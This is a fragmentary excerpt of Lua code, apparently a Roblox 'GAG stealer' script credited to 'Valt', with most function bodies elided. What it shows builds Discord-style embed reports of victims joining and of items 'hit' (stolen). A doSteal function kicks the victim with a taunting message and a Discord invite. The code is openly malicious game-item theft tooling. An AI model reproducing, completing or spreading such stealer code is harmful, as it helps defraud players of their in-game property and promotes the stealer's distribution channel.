...
local function SendJoinMessage(list, prefix)
    ...
    local data = {
        ...
        ["embeds"] = {{
            ["title"] = "\240\159\140\180 Valt hit muna baka mawla",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "GAG stealer by Valt. discord.gg/LOSERYOUARE"
            }
        }}
    }
...
local function SendMessage(sortedItems)
    ...
    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\140\180 Mga na hit mo Valt" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "GAG stealer by Valt. discord.gg/LOSERYOUARE"
...
if #itemsToSend > 0 then
    ...
    local function doSteal(player)
        ...
        plr:kick("All your stuff just got stolen by Valt's stealer!\n Join discord.gg/LOSERYOUARE")
    end
